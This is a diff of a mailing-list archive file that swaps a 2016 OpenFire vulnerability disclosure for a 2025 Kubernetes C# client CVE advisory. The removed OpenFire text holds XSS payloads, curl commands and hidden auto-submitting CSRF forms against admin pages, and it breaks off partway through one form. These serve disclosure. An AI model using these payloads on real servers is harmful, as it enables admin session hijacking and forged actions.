@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["29405" "Tuesday" "5" "July" "2016" "16:21:32" "+0200" "Sysdream Labs" "labs@sysdream.com" "<577BC26C.8030408@sysdream.com>" "878" "[oss-security] CVE ID Request : OpenFire multiple vulnerabilities" nil nil nil "7" "2016070514:21:32" "[oss-security] CVE ID Request : OpenFire multiple vulnerabilities" (number mark "U       labs@sysdrea Jul  5  878/29405 " thread-indent "\"[oss-security] CVE ID Request : OpenFire multiple vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 32517 invoked by uid 550); 5 Jul 2016 14:39:37 -0000
+Received: (qmail 3907 invoked by uid 550); 16 Sep 2025 16:09:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,895 +7,397 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24331 invoked from network); 5 Jul 2016 14:21:47 -0000
-X-Virus-Scanned: amavisd-new at sysdream.com
-To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
-From: Sysdream Labs <labs@sysdream.com>
-Message-ID: <577BC26C.8030408@sysdream.com>
-Date: Tue, 5 Jul 2016 16:21:32 +0200
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
- Thunderbird/38.7.0
+x-ms-reactions: disallow
+Received: (qmail 13598 invoked from network); 16 Sep 2025 16:01:33 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1758038483; x=1758643283; darn=lists.openwall.com;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=gzutxhKc8rES5sppaqL/XptNtEQYd+AqY4xLsArj+64=;
+        b=j2yDGlnBRManwHoQdFp0vS4Hm4GVNvW8Bs07WPMsmx/zg6mOUAuwL/Xvp7IBHjppMT
+         1y1ItTwnznd9J2uHGyaK+qUgsTfnKuKQlOSt+T0hle4VbBUFVb9VXnR/RiEd6fyou76g
+         ALkh8iKm4+ONdKxlfNm+KLqc9gUN0SlluIq8+E1f3azF6wwQtrGVxHv971GzCR9UBhD2
+         LkCDGL7vEgXptDAtZZfz3GLW8XqwmuNVyDqfU3/zcGXA4PN+gY8qrVd7Fz8VBVYstnyc
+         8cDdbz5SYsWhazWp9Tp/qydE5RCSUASw59AL3AC4H4hOx/3Yk5gAkhrO3kkng3Ms2v9F
+         WMMA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1758038483; x=1758643283;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=gzutxhKc8rES5sppaqL/XptNtEQYd+AqY4xLsArj+64=;
+        b=RQkOUV3qeBwFSMzIQ2LmPmrV65289ItvMMFKsUd0p2ibA6WuEqTAkID2rzKb7Ri1IR
+         b5NKBv4E3lltWs9OjygJPGkGvpPP9mhbE3WV4EAYaapvHPHCQLRfK++AKADyxHDebMfc
+         gEe/qlzmMJeMeTJ0g/FpxPaDcfobNwjOoYGJoVKhKcqiFRl1r9VAKpPxRENBImtMfQt3
+         xFG1G43DRT+w1QncHI4l9eF7QytRrP2dm+Cwg4nQZdaK0Yg1dTOvdcLy7QQ1Cfqm9XGR
+         2Il2d7XfubM06YMjnU7T05VkLj7oEgE5Lei7U0jCEcLvUbF8B5zR92+jJstfELxjPrP8
+         WylA==
+X-Gm-Message-State: AOJu0YzNkEojFrxzTrfXZa7YpWUH0FnUNnz/nOIpOvYlcEZ0a0IYBZJZ
+	lwvCnK3IxC2fK5CXUYcA0MNKow1+XKfrQt2ezdtbloq042X3qim7Afn0efy2LOOsdktfpznp2XP
+	zRpLfa2FPxYBHDwDBLYS4qE+VBQK/uDfPxBicmH0=
+X-Gm-Gg: ASbGncuZie/lqfwNoM2p3e7KiNjPsu0GJiizDgqqKaxRPmOxamXxE7zaudViHx1iZmX
+	zS3UNaUa8mQWgL6LamkQ2sx1KHSuXTcNAnavRonVHHlLPhmRquzmw2h/bTJKtHXdwRC5AKODgsu
+	LXr+iw+sjVJBOYmmbiecmLqokT/mPU47zh4ngLTlgyNbrInSfGKX3hmoR7Mx5YDP40a5QGpMXNF
+	/QaSv052hkDN/DQkw==
+X-Google-Smtp-Source: AGHT+IGMNHU7FkB/YOsXLkYmI3ZYTQNOMQfFEZvykCaZPuN9aJX5WosWdFAFTlIjkMPjrM2H0z9U+YQWhYC0CJZuk1c=
+X-Received: by 2002:a17:902:fc4f:b0:264:5f1a:1e46 with SMTP id
+ d9443c01a7336-2645f1a2097mr115565795ad.26.1758038482707; Tue, 16 Sep 2025
+ 09:01:22 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e"
-Subject: [oss-security] CVE ID Request : OpenFire multiple vulnerabilities
+From: Rita Zhang <rita.z.zhang@gmail.com>
+Date: Tue, 16 Sep 2025 09:00:00 -0700
+X-Gm-Features: AS18NWBp7UEixiz5BuifNIN6BBzIDWLTjuJuoDOnAAqGdE2J168hbDSqTMBb91I
+Message-ID: <CAL7+V1ywnohQgfQWBVeoYexqnO2S72dJhaWaX3s88qsYrpxjyw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000436cfa063eed3be3"
+Subject: [oss-security] [kubernetes] CVE-2025-9708: Kubernetes C# Client: improper
+ certificate validation in custom CA mode may lead to man-in-the-middle attacks
 
---oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e
-Content-Type: text/plain; charset=utf-8
+--000000000000436cfa063eed3be3
+Content-Type: text/plain; charset="UTF-8"
+
+Hello Kubernetes Community,
+
+A vulnerability exists in the Kubernetes C# client where the certificate
+validation logic accepts properly constructed certificates from any
+Certificate Authority (CA) without properly verifying the trust chain. This
+flaw allows a malicious actor to present a forged certificate and
+potentially intercept or manipulate communication with the Kubernetes API
+server, leading to possible man-in-the-middle attacks and API impersonation.
+
+This issue has been rated Med (6.8)
+CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
+<https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N>,
+and assigned CVE-2025-9708.
+
+Am I vulnerable?
+
+You are vulnerable if:
+
+- You use the Kubernetes C# client to connect to a Kubernetes API server
+over TLS/HTTPS  with custom CA certificates in your kubeconfig file and
+your connection occurs over an untrusted network.
+
+Affected Versions
+
+   -
+
+   All versions of the Kubernetes C# client prior to the next release
+   <=17.0.13
+
+How do I mitigate this vulnerability?
+
+This issue can be mitigated by:
+
+
+   -
+
+   Deploy the patch version of the Kubernetes C# client as soon as possible.
+   -
+
+   Moving the CA certificates into the system trust store instead of
+   specifying them in the kubeconfig file. Note: This approach may introduce
+   new risks, as all processes on the system will begin to trust certificates
+   signed by that CA. If you must use an affected version, you can disable
+   custom CA and add the CA to the machine's trusted root.
+
+Fixed Versions
+
+   -
+
+   Kubernetes C# client >= v17.0.14
+
+Detection
+
+To determine if your applications are affected:
+
+   -
+
+   Review your usage of the Kubernetes C# client and inspect certificate
+   validation logic.
+   -
+
+   Review your kubeconfig files and determine if you use a custom CA
+   certificate (the certificate-authority field in the clusters section).
+   -
+
+   Review client logs for unexpected or untrusted certificate connections.
+
+
+If you find evidence that this vulnerability has been exploited, please
+contact security@kubernetes.io
+
+Thank You,
+
+Rita Zhang on behalf of the Kubernetes Security Response Committee
+
+Additional Details
+
+See the GitHub issue for more details:
+https://github.com/kubernetes/kubernetes/issues/134063
+
+Acknowledgements
+
+This vulnerability was reported by @elliott-beach
+
+The issue was fixed and coordinated by:
+
+Boshi Lian @tg123
+
+Brendan Burns @brendandburns
+
+Rita Zhang @ritazh
+
+Thank You,
+
+Rita Zhang on behalf of the Kubernetes Security Response Committee
+
+--000000000000436cfa063eed3be3
+Content-Type: text/html; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-# Several vulnerabilities doscovered in OpenFire version 3.10.2  to 4.0.1
-
-
-## Product Description
-
-**OpenFire** is an opensource project under GNU GPL licence. It provides a =
-Jabber/XMPP server fully develloped in Java. It's develloped by the **Ignit=
-e realtime** community.
-The actual version of the product is 4.0.2.=20
-
-Official web site : http://igniterealtime.org/
-
-Several vulnerabilities have been discovered between 2015, October and 2016=
-, February.
-Reported vulnerabilities are similar to those previously discovered by hyp3=
-rlinx, although they concern different pages.
-
-In brief, the flaws are of the following kinds: CSRF, XSS (reflected and st=
-ored), file upload and information disclosure. Most vulnerabilities need an=
- administration access to the web application and may lead to personal info=
-rmation leakage or account take-over.
-
-**Ingnite realtime** fixed some vulnerabilities (the corresponding commit I=
-D are indicated in this document).
-
-
-## Several Relected XSS Vulnerabilities identified in Openfire 3.10.2
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-79
-
-**CVSS Base Score**: 5.2
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several XSS vulnerabilities have been found on several pages of the adminis=
-tration panel. Reflected XSS may lead to session hijacking on admin user.
-
-### Proof of Concept
-
-#### *domain* and *remotePort* variables from *server2server-settings.jsp*
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePor=
-t=3D5269&serverAllowed=3DAdd+Server
-```
-
-or
-
-```
-domain=3Dtestt&remotePort=3D5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3=
-C%2Fscript%3E&serverAllowed=3DAdd+Server
-```
-
-or
-
-```
-
-domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlo=
-cked=3DBlock+Server
-```
-
-You can reproduce the exploitation with the following curl commands:
-
-```
-curl --data "domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
-%3E&remotePort=3D5269&serverAllowed=3DAdd+Server" https://OpenFireServerIP:=
-9090/server2server-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20
-
-curl --data "domain=3Dtest&remotePort=3D5269%22%2F%3E%3Cscript%3Ealert%28%2=
-7XSS%27%29%3C%2Fscript%3E&serverAllowed=3DAdd+Server" https://OpenFireServe=
-rIP:9090/server2server-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20
-
-curl --data "domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
-%3E&serverBlocked=3DBlock+Server" https://OpenFireServerIP:9090/server2serv=
-er-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20
-```
-
-#### *criteria* variable from *plugins/search/advance-user-search.jsp*
-
-The following GET request exploits the XSS vulnerability:
-
-```
-http://OpenFireServerIP:9090/[[http://OpenFireServerIP:9090/plugins/search/=
-advance-user-search.jsp?search=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%=
-22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=3DSearch
-```
-
-
-## Several stored XSS Vulnerabilities identified in Openfire 3.10.2
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-79
-
-**CVSS Base Score**: 5.5
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several XSS vulnerabilities have been found on several pages of the adminis=
-tration panel. Stored XSS could lead to session hijacking on admin user.
-
-### Proof of Concept
-
-#### *mucdesc* variable from *muc-service-edit-form.jsp*
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-save=3Dtrue&mucname=3Dtest&mucdesc=3Dtest%22%2F%3E%3Cscript%3Ealert%28%27XS=
-S-2%27%29%3C%2Fscript%3E
-```
-
-The following code allows the creation of a web frame exploiting the vulner=
-ability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/muc-service-ed=
-it-form.jsp" >
-<input type=3D"text" name=3D"save" value=3D"true" >
-<input type=3D"text" name=3D"mucname" value=3D"test" >
-<input type=3D"text" name=3D"mucdesc" value=3D"%22/><script>alert('XSS')</s=
-cript>" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-or with this curl command:
-
-```
-curl --data "save=3Dtrue&mucname=3Dtest&mucdesc=3Dtest%22%2F%3E%3Cscript%3E=
-alert%28%27XSS-2%27%29%3C%2Fscript%3E" https://OpenFireServerIP:9090/muc-se=
-rvice-edit-form.jsp --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-searchEnabled=3Dtrue&searchname=3Dsearch%22%2F%3E%3Cscript%3Ealert%28%27XSS=
-%27%29%3C%2Fscript%3E&groupOnly=3Dfalse
-```
-
-The following code allows the creation of a web frame exploiting the vulner=
-ability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/plugins/search=
-/search-props-edit-form.jsp?save" method=3D"post" target=3D"xss-frame" >
-<input type=3D"text" name=3D"searchEnabled" value=3D"true" >
-<input type=3D"text" name=3D"searchname" value=3D"search%22/><script>alert(=
-'XSS')</script>" >
-<input type=3D"text" name=3D"groupOnly" value=3D"false" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-or with this curl command:
-
-```
-curl "http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.js=
-p" --data=3D"searchEnabled=3Dtrue&searchname=3D%22/%3E%3Cscript%3Ealert('XS=
-S')%3C/script%3E&groupOnly=3Dfalse" --cookie=3D"JSESSIONID=3DXXX"
-```
-
-
-#### *searchname* variable from *page plugins/search/search-props-edit-form=
-.jsp*
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-propName=3DadminConsole.port&propValue=3D9090%22+onmouseover%3D%22alert%28%=
-27xxs%27%29%22+x%3D%22&encrypt=3Dfalse&save=3DSave+Property
-```
-
-The following code allows the creation of a web frame exploiting the vulner=
-ability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-propert=
-ies.jsp" method=3D"post" target=3D"xss-frame" >
-<input type=3D"text" name=3D"propValue" value=3D"=3DadminConsole.port" >
-<input type=3D"text" name=3D"searchname" value=3D"9090%22 onmouseover=3D%22=
-alert('XSS')%22 x=3D"/>
-<input type=3D"text" name=3D"encrypt" value=3D"false" >
-<input type=3D"text" name=3D"save" value=3D"Save Property" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-or with this curl command:
-
-```
-curl --data "searchEnabled=3Dtrue&searchname=3Dsearch%22%2F%3E%3Cscript%3Ea=
-lert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=3Dfalse" https://OpenFireServe=
-rIP:9090/plugins/search/search-props-edit-form.jsp --cookie=3D"JSESSIONID=
-=3DXXX"
-```
-
-#### *serverName* variable from *plugins/search/search-props-edit-form.jsp*
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-serverName=3Dlocalhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29=
-%3C%2Fscript%3E&serverPort=3D5269&componentPort=3D5275&port=3D5222&sslEnabl=
-ed=3Dtrue&sslPort=3D5223&embeddedPort=3D9090&embeddedSecurePort=3D9091&jmxE=
-nabled=3Dfalse&jmxSecure=3Dtrue&jmxPort=3D1099&save=3DSave+Properties
-```
-
-The following code allows the creation of a web frame exploiting the vulner=
-ability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-props.j=
-sp" method=3D"post" target=3D"xss-frame" >
-<input type=3D"text" name=3D"serverName" value=3D"localhost.localdomain%22%=
-2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" >
-<input type=3D"text" name=3D"serverPort" value=3D"5269" >
-<input type=3D"text" name=3D"componentPort" value=3D"5275" >
-<input type=3D"text" name=3D"port" value=3D"5222" >
-<input type=3D"text" name=3D"sslEnabled" value=3D"true" >
-<input type=3D"text" name=3D"sslPort" value=3D"5223" >
-<input type=3D"text" name=3D"embeddedPort" value=3D"9090" >
-<input type=3D"text" name=3D"embeddedSecurePort" value=3D"9091" >
-<input type=3D"text" name=3D"jmxEnabled" value=3D"false" >
-<input type=3D"text" name=3D"jmxSecure" value=3D"true" >
-<input type=3D"text" name=3D"jmxPort" value=3D"1099" >
-<input type=3D"text" name=3D"save" value=3D"Save+Properties" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-or with this curl command:
-
-```
-curl --data "serverName=3Dlocalhost.localdomain%22%2F%3E%3Cscript%3Ealert%2=
-8%27XSS%27%29%3C%2Fscript%3E&serverPort=3D5269&componentPort=3D5275&port=3D=
-5222&sslEnabled=3Dtrue&sslPort=3D5223&embeddedPort=3D9090&embeddedSecurePor=
-t=3D9091&jmxEnabled=3Dfalse&jmxSecure=3Dtrue&jmxPort=3D1099&save=3DSave+Pro=
-perties" https://OpenFireServerIP:9090/server-props.jsp --cookie=3D"JSESSIO=
-NID=3DXXX"
-```
-
-### Affected versions
-
-* Version >=3D 3.10.2 and < 4.0.0
-
-
-## Several Relected XSS Vulnerabilities identified in Openfire 4.0.0 and 4.=
-0.1
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-79
-
-**CVSS Base Score**: 5.2
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several XSS vulnerabilities have been found on several pages of the adminis=
-tration panel. Reflected XSS could lead to session hijacking against an adm=
-inistrator.
-
-Some of these vulnerabilities have already been found by hyp3rlinx, but had=
- not been patched properly.
-
-### Proof of Concept
-
-#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from *=
-page create-bookmark.jsp* suffer from the vulnerability
-
-The following POST values can be sent to trigger the vulnerability:
-
-```
-groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS1%27%29%3C%2Fscript%3E&grou=
-pchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS2%27%29%3C%2Fscript%3E%C2%B2&use=
-rs=3D%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&groups=3D%22%3E=
-%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&createGroupchatBookmark=3D=
-Create&type=3Dgroupchat
-```
-
-The following curl command allows reproducing the attack against the Openfi=
-re *plugins/bookmarks/create-bookmark.jsp* page:
-
-```
-curl --data "save=3Dtrue&mucname=3Dconference&mucdesc=3DPublic+Chatrooms%22=
-%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" https://OpenFireServerI=
-P:9090/muc-service-edit-form.jsp --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *search* variable from *group-summary.jsp*
-
-The following GET request exploit the XSS vulnerability:
-
-```
-http://OpenFireServerIP:9090/group-summary.jsp?search=3Dtest%22+onmouseover=
-%3Dalert%28%27XSS%27%29+x%3D%22
-```
-
-The following curl command allows reproducing the attack against the Openfi=
-re *group-summary.jsp* page.
-
-```
-curl http://OpenFireServerIP:9090/group-summary.jsp?search=3Dtest%22+onmous=
-eover%3Dalert%28%27XSS%27%29+x%3D%22 --cookie=3D"JSESSIONID=3DXXX"
-```
-
-
-#### *maxTotalSize*, *maxFileSize*, *maxDays*, *logTimeout* variables from =
-*audit-policy.jsp*
-
-The following GET request exploit the XSS vulnerability:
-
-```
-http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=3Dfalse&logDir=
-=3D%2Fopt%2Fopenfire%2Flogs&maxTotalSize=3D1000%22%3E%3Cscript%3Ealert%28%2=
-7XSS3%27%29%3C%2Fscript%3E&maxFileSize=3D10%22%3E%3Cscript%3Ealert%28%27XSS=
-4%27%29%3C%2Fscript%3E&maxDays=3D-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%=
-3C%2Fscript%3E&logTimeout=3D120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2=
-Fscript%3E&ignore=3D&update=3DSave+Settings
-```
-
-The following curl command allows reproducing the attack against the Openfi=
-re *audit-policy.jsp* page:
-
-```
-curl "http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=3Dfalse&lo=
-gDir=3D%2Fopt%2Fopenfire%2Flogs&maxTotalSize=3D1000%22%3E%3Cscript%3Ealert%=
-28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=3D10%22%3E%3Cscript%3Ealert%28%2=
-7XSS4%27%29%3C%2Fscript%3E&maxDays=3D-1%22%3E%3Cscript%3Ealert%28%27XSS5%27=
-%29%3C%2Fscript%3E&logTimeout=3D120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%=
-3C%2Fscript%3E&ignore=3D&update=3DSave+Settings" --cookie=3D"JSESSIONID=3DX=
-XX"
-```
-
-#### *passPhrase* variables from *import-keystore-certificate.jsp*
-
-The following POST values exploit the XSS vulnerability:
-
-```
-passPhrase=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateK=
-ey=3Dtest&certificate=3Dtest&save=3DSave
-```
-
-The following curl command allows reproducing the attack against the Openfi=
-re *import-keystore-certificate.jsp* page.
-
-```
-curl http://OpenFireServerIP:9090/import-keystore-certificate.jsp --data=3D=
-"passPhrase=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&private=
-Key=3Dtest&certificate=3Dtest&save=3DSave" --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *criteria* variable from */plugins/search/advance-user-search.jsp*
-
-The following GET request exploit the XSS vulnerability:
-
-```
-http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=
-=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%28%27X=
-SS%27%29%3C/script%3E&search=3DSearch
-```
-
-The following curl command allows reproducing the attack against the Openfi=
-re *plugins/search/advance-user-search.jsp* admin page.
-
-```
-curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?s=
-earch=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%2=
-8%27XSS%27%29%3C/script%3E&search=3DSearch" --cookie=3D"JSESSIONID=3DXXX"
-```
-
-### Affected versions
-
-* Version 4.0.0 and 4.0.1
-
-## Several stored XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1
-
-Some of these vulnerabilities have already been found by hyp3rlinx, but has=
- not been patched since.
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-79
-
-**CVSS Base Score**: 5.5
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several XSS vulnerabilities have been found on several pages of the adminis=
-tration panel. Stored XSS could lead to session hijacking on admin user.
-
-### Proof of Concept
-
-#### *subdomain* variable from *connection-settings-external-components.jsp*
-
-The following curl command allows reproducing the attack against the Openfi=
-re *connection-settings-external-components.jsp* page:
-
-```
-curl --data "subdomain=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
-%3E&secret=3Dtoto&componentAllowed=3DAdd+Component" https://OpenFireServerI=
-P:9090/connection-settings-external-components.jsp --cookie=3D"JSESSIONID=
-=3DXXX"
-```
-
-Or
-
-```
-curl --data "subdomain=3D%22%3Escript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E=
-&componentBlocked=3DBlock+Component" https://OpenFireServerIP:9090/connecti=
-on-settings-external-components.jsp --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *mucdesc* variable from *muc-service-edit-form.jsp*
-
-The following curl command allows reproducing the attack against the Openfi=
-re *muc-service-edit-form.jsp* page:
-
-```
-curl --data "groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fsc=
-ript%3E&groupchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3=
-E%C2%B2&users=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&group=
-s=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBo=
-okmark=3DCreate&type=3Dgroupchat" https://OpenFireServerIP:9090/plugins/boo=
-kmarks/create-bookmark.jsp --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from p=
-age muc-service-edit-form.jsp
-
-The following curl command allows reproducing the attack against the Openfi=
-re *muc-service-edit-form.jsp* page:
-
-```
-curl --data "groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fsc=
-ript%3E&groupchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3=
-E%C2%B2&users=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&group=
-s=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBo=
-okmark=3DCreate&type=3Dgroupchat" https://OpenFireServerIP:9090/plugins/boo=
-kmarks/create-bookmark.jsp --cookie=3D"JSESSIONID=3DXXX"
-```
-
-#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*
-
-The following curl command allows reproducing the attack against the Openfi=
-re *plugins/search/advance-user-search.jsp* page:
-
-```
-curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?s=
-earch=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%2=
-8%27XSS%27%29%3C/script%3E&search=3DSearch" --cookie=3D"JSESSIONID=3DXXX"
-```
-
-The folling code allows exploiting the vulnerability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/plugins/search=
-/search-props-edit-form.jsp?save" method=3D"post" target=3D"xss-frame" >
-<input type=3D"text" name=3D"searchEnabled" value=3D"true" >
-<input type=3D"text" name=3D"searchname" value=3D"search%22/><script>alert(=
-'XSS')</script>" >
-<input type=3D"text" name=3D"groupOnly" value=3D"false" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-#### *propValue* variable from *server-properties.jsp*
-
-The following curl command allows reproducing the attack against the Openfi=
-re *server-properties.jsp* page:
-
-```
-curl --data=3D"propName=3DadminConsole.port&propValue=3D9090%22+onmouseover=
-%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=3Dfalse&save=3DSave+Property"=
- http://OpenFireServerIP:9090/server-properties.jsp --cookie=3D"JSESSIONID=
-=3DXXX"
-```
-
-The folling code allows exploiting the vulnerability:
-
-```
-<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
-<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-propert=
-ies.jsp" method=3D"post" target=3D"xss-frame" >
-<input type=3D"text" name=3D"propValue" value=3D"=3DadminConsole.port" >
-<input type=3D"text" name=3D"searchname" value=3D"9090%22 onmouseover=3D%22=
-alert('XSS')%22 x=3D"/>
-<input type=3D"text" name=3D"encrypt" value=3D"false" >
-<input type=3D"text" name=3D"save" value=3D"Save Property" >
-</form>
-
-<script>document.getElementById("xss-form").submit()</script>
-```
-
-
-###Affected versions
-
-* Version 4.0.0 and 4.0.1
-
-
-## Several CSRF Vulnerabilities identified in Openfire 3.10.2
-
-**Access Vector**: remote
-
-**Security Risk**: low
-
-**Vulnerability**: CWE-312
-
-**CVSS Base Score**: 5.4
-
-[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
-N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O
-
-### Vulnerability Description
-
-Several CSRF vulnerabilities have been found on different pages of the admi=
-n panel of the OpenFire web server. Throught this attack an attacker could =
-drive a valid user to execute unwittingly a request on the OpenFire sever.
-
-
-### Proof of Concept
-
-#### *connection-settings-external-components.jsp* page is vulerable to a C=
-SRF attack.
-
-The following HTML iframe command allows reproducing the attack against the=
- Openfire *dwr/exec/downloader.installPlugin.dwr* page:
-
-```
-<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
-<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/dwr/exec/down=
-loader.installPlugin.dwr" method=3D"post" target=3D"csrf-frame" >
-    <input type=3D"text" name=3D"callCount" value=3D"1" >
-    <input type=3D"text" name=3D"c0-scriptName" value=3D"downloader" >
